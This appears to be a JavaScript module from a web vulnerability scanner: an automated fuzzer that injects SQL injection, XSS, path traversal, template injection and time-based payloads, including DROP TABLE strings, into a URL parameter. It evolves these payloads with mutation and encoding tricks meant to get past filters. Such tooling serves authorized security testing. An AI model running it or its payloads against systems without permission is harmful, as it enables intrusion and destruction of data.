/**
 * Intelligent Fuzzer - Mutation-Based Testing
 * Generates intelligent payloads based on response analysis
 * Features:
 * - Mutation engine (genetic algorithm-inspired)
 * - Response differential analysis
 * - Smart payload generation
 * - Learning from successful injections
 */

const crypto = require('crypto');
const { SecureHttpClient } = require('../utils/secure-http-client');
const { logger } = require('../utils/error-handler');

class IntelligentFuzzer {
  constructor(domain, options = {}) {
    this.httpClient = new SecureHttpClient({ timeout: 15000, maxContentLength: 10 * 1024 * 1024 });
    this.domain = domain;
    this.generations = options.generations || 5;
    this.populationSize = options.populationSize || 20;
    this.mutationRate = options.mutationRate || 0.3;
    this.crossoverRate = options.crossoverRate || 0.7;
    this.successfulPayloads = [];
    this.population = [];
  }

  // Seed payloads - starting point for mutations
  getSeedPayloads() {
    return [
      "'", "\"", "1'", "1\"",
      "' OR '1'='1", "' OR 1=1--",
      "<script>alert(1)</script>",
      "'; DROP TABLE users--",
      "../../../etc/passwd",
      "${7*7}", "{{7*7}}",
      "' AND SLEEP(5)--"
    ];
  }

  async fuzz(url, parameter) {
    console.log(`    🧬 Fuzzing ${parameter} with ${this.generations} generations...`);
    
    // Initialize population with seed payloads
    this.population = this.getSeedPayloads().map(payload => ({
      payload,
      fitness: 0,
      tested: false
    }));

    // Evolutionary loop
    for (let gen = 0; gen < this.generations; gen++) {
      console.log(`    Generation ${gen + 1}/${this.generations}`);
      
      // Test current population
      await this.evaluatePopulation(url, parameter);
      
      // Select best performers
      const elite = this.selectElite();
      
      // Generate next generation
      const offspring = this.reproduce(elite);
      
      // Mutate
      const mutated = this.mutate(offspring);
      
      // Replace population
      this.population = [...elite, ...mutated];
    }

    return {
      successfulPayloads: this.successfulPayloads,
      bestPayloads: this.population
        .sort((a, b) => b.fitness - a.fitness)
        .slice(0, 5)
        .map(p => p.payload)
    };
  }

  async evaluatePopulation(url, parameter) {
    for (const individual of this.population) {
      if (individual.tested) continue;
      
      try {
        const response = await this.testPayload(url, parameter, individual.payload);
        individual.fitness = this.calculateFitness(response);
        individual.tested = true;
        
        // If high fitness, it's a successful injection
        if (individual.fitness > 80) {
          this.successfulPayloads.push({
            payload: individual.payload,
            fitness: individual.fitness,
            indicators: response.indicators
          });
        }
      } catch (error) {
        individual.fitness = 0;
        individual.tested = true;
      }
    }
  }

  async testPayload(url, parameter, payload) {
    const axios = require('axios');
    const testURL = new URL(url);
    testURL.searchParams.set(parameter, payload);
    
    const startTime = Date.now();
    const response = await this.httpClient.get(testURL.toString(), {
      timeout: 8000,
      validateStatus: () => true
    });
    const responseTime = Date.now() - startTime;
    
    return {
      status: response.status,
      length: response.data.length,
      responseTime,
      data: response.data,
      headers: response.headers
    };
  }

  calculateFitness(response) {
    let fitness = 0;
    const data = response.data.toLowerCase();
    
    // Error indicators (high fitness)
    const errorPatterns = [
      /sql syntax/i,
      /mysql/i,
      /postgresql/i,
      /ora-\d{5}/i,
      /warning/i,
      /error/i,
      /exception/i,
      /syntax error/i,
      /unclosed/i
    ];
    
    const indicators = [];
    for (const pattern of errorPatterns) {
      if (pattern.test(data)) {
        fitness += 30;
        indicators.push(pattern.source);
      }
    }
    
    // Time-based indicators
    if (response.responseTime > 4500) {
      fitness += 50;
      indicators.push('time-delay');
    }
    
    // Status code changes
    if (response.status === 500 || response.status === 400) {
      fitness += 20;
      indicators.push('status-' + response.status);
    }
    
    // Length differential (may indicate boolean injection)
    if (response.length < 100 || response.length > 100000) {
      fitness += 10;
      indicators.push('length-anomaly');
    }
    
    response.indicators = indicators;
    return Math.min(fitness, 100);
  }

  selectElite() {
    // Select top 20% of population
    const sorted = this.population
      .filter(p => p.tested)
      .sort((a, b) => b.fitness - a.fitness);
    
    const eliteSize = Math.ceil(sorted.length * 0.2);
    return sorted.slice(0, eliteSize);
  }

  reproduce(elite) {
    const offspring = [];
    const targetSize = this.populationSize - elite.length;
    
    for (let i = 0; i < targetSize; i++) {
      if (Math.random() < this.crossoverRate) {
        // Crossover: combine two parents
        const parent1 = elite[Math.floor(Math.random() * elite.length)];
        const parent2 = elite[Math.floor(Math.random() * elite.length)];
        const child = this.crossover(parent1.payload, parent2.payload);
        offspring.push({ payload: child, fitness: 0, tested: false });
      } else {
        // Clone elite
        const parent = elite[Math.floor(Math.random() * elite.length)];
        offspring.push({ payload: parent.payload, fitness: 0, tested: false });
      }
    }
    
    return offspring;
  }

  crossover(payload1, payload2) {
    // Single-point crossover
    const point = Math.floor(Math.min(payload1.length, payload2.length) / 2);
    return payload1.substring(0, point) + payload2.substring(point);
  }

  mutate(offspring) {
    const mutations = [
      // Character mutations
      p => p + "'",
      p => p + "\"",
      p => p + "--",
      p => p + "#",
      p => p + "/**/",
      p => "'" + p,
      p => p.replace("'", "\""),
      
      // SQL keyword injection
      p => p + " OR 1=1",
      p => p + " AND 1=1",
      p => p + " UNION SELECT",
      p => p + "; DROP TABLE",
      
      // Encoding mutations
      p => encodeURIComponent(p),
      p => p.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join(''),
      
      // Case mutations
      p => p.toUpperCase(),
      p => p.toLowerCase(),
      
      // Whitespace mutations
      p => p.replace(/ /g, '/**/'),
      p => p.replace(/ /g, '\t'),
      
      // Comment mutations
      p => p + '/*comment*/',
      p => '/**/' + p + '/**/',
      
      // Null byte
      p => p + '%00',
      p => p + '\x00'
    ];
    
    return offspring.map(individual => {
      if (Math.random() < this.mutationRate) {
        const mutation = mutations[Math.floor(Math.random() * mutations.length)];
        try {
          individual.payload = mutation(individual.payload);
        } catch (e) {
          // Keep original if mutation fails
        }
      }
      return individual;
    });
  }
}

module.exports = IntelligentFuzzer;
